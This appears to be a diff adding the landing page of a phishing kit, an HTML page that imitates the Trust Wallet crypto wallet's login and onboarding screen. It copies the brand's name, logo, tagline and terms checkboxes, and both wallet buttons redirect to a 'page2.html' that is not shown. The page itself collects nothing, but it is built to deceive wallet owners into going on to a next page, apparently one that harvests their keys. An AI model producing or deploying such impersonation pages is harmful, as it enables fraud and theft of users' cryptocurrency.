@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Trust Wallet - Login</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    background-color: #10111a; color: #ffffff;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    height: 100vh; display: flex; overflow: hidden;
+  }
+  .left-side {
+    width: 50%; height: 100%; background-color: #10111a;
+    display: flex; justify-content: center; align-items: center; overflow: hidden;
+  }
+  .left-side video {
+    width: 100%; height: 100%; object-fit: contain; display: block; background-color: #10111a;
+  }
+  .right-side {
+    width: 50%; height: 100%; display: flex; flex-direction: column;
+    justify-content: center; padding: 20px 6%; background-color: #10111a; overflow-y: auto; 
+  }
+  .logo { display: flex; align-items: center; gap: 12px; margin-bottom: 35px; }
+  .logo svg { width: 38px; height: 38px; }
+  .logo-text { display: flex; align-items: center; font-size: 32px; letter-spacing: 0.5px; }
+  .logo-text .trust { font-weight: 900; color: #00ff66; }
+  .logo-text .wallet { font-weight: 300; color: #00ff66; margin-left: 6px; }
+  h1 { font-size: 28px; line-height: 1.3; margin-bottom: 25px; font-weight: 700; color: #ffffff; }
+  .checkbox-group { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; font-size: 14px; color: #a0a0a0; }
+  .checkbox-item { display: flex; align-items: flex-start; gap: 10px; cursor: pointer; }
+  .checkbox-item input[type="checkbox"] { margin-top: 3px; accent-color: #4b3aff; width: 18px; height: 18px; cursor: pointer; flex-shrink: 0; }
+  .checkbox-item a { color: #ffffff; text-decoration: none; font-weight: bold; }
+  .btn {
+    width: 100%; padding: 16px; border-radius: 40px; border: none; font-size: 16px;
+    font-weight: 600; margin-bottom: 15px; flex-shrink: 0; transition: all 0.3s ease;
+  }
+  .btn-primary { background-color: #1e2025; color: #666666; cursor: not-allowed; }
+  .btn-primary.active { background-color: #4b3aff; color: #ffffff; cursor: pointer; box-shadow: 0 4px 15px rgba(75, 58, 255, 0.3); }
+  .btn-secondary { background-color: #1e2025; color: #ffffff; cursor: pointer; }
+  .btn-secondary:hover { background-color: #2a2d33; }
+  .divider { display: flex; align-items: center; text-align: center; color: #666666; font-size: 12px; margin: 20px 0; flex-shrink: 0; }
+  .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #333333; }
+  .divider::before { margin-right: 15px; }
+  .divider::after { margin-left: 15px; }
+  .qr-section { display: flex; align-items: center; gap: 15px; font-size: 13px; font-weight: 600; color: #ffffff; flex-shrink: 0; }
+  .qr-placeholder { width: 40px; height: 40px; background: #1e2025; border-radius: 8px; display: flex; justify-content: center; align-items: center; color: #3275f3; font-size: 18px; flex-shrink: 0; }
+  
+  @media (max-width: 900px) {
+    body { flex-direction: column; height: 100vh; overflow: hidden; }
+    .left-side { width: 100%; height: 40%; }
+    .right-side { width: 100%; height: 60%; padding: 20px 5%; justify-content: flex-start; overflow-y: auto; }
+    .logo-text { font-size: 26px; }
+    .logo svg { width: 32px; height: 32px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="left-side">
+    <video autoplay loop muted playsinline>
+      <source src="vv.mp4" type="video/mp4">
+    </video>
+  </div>
+
+  <div class="right-side">
+    <div class="logo">
+      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <defs><linearGradient id="shieldGradient" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#00ff66" /><stop offset="100%" stop-color="#3375ff" /></linearGradient></defs>
+        <path d="M50 5 L90 20 C90 60 75 90 50 95 C25 90 10 60 10 20 Z" fill="url(#shieldGradient)" />
+        <path d="M50 5 L50 95" stroke="rgba(0,0,0,0.1)" stroke-width="1" />
+        <path d="M50 5 L90 20 C90 60 75 90 50 95" fill="rgba(0,0,0,0.05)" />
+      </svg>
+      <div class="logo-text"><span class="trust">TRUST</span><span class="wallet">WALLET</span></div>
+    </div>
+
+    <h1>Join 200M users securing their financial future</h1>
+
+    <div class="checkbox-group">
+      <label class="checkbox-item"><input type="checkbox" checked><span>Share error reports to help us fix problems</span></label>
+      <label class="checkbox-item"><input type="checkbox" checked><span>Share anonymous product analytics to help improve Trust Wallet</span></label>
+      <label class="checkbox-item"><input type="checkbox" id="terms-checkbox"><span>I have read and agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></span></label>
+    </div>
+
+    <!-- REDIRECTION ADDED HERE -->
+    <button class="btn btn-primary" id="btn-wallet" disabled onclick="window.location.href='page2.html'">I already have a wallet</button>
+    <button class="btn btn-secondary" id="btn-create" onclick="window.location.href='page2.html'">Create a new wallet</button>
+
+    <div class="divider">Have you installed the Trust Wallet mobile app? 📱</div>
+
+    <div class="qr-section">
+      <div class="qr-placeholder">🔳</div>
+      <div>Scan the QR code to sync</div>
+    </div>
+  </div>
+
+  <script>
+    const termsCheckbox = document.getElementById('terms-checkbox');
+    const walletButton = document.getElementById('btn-wallet');
+    termsCheckbox.addEventListener('change', function() {
+      if (this.checked) {
+        walletButton.removeAttribute('disabled');
+        walletButton.classList.add('active');
+      } else {
+        walletButton.setAttribute('disabled', 'true');
+        walletButton.classList.remove('active');
+      }
+    });
+  </script>
+</body>
+</html>
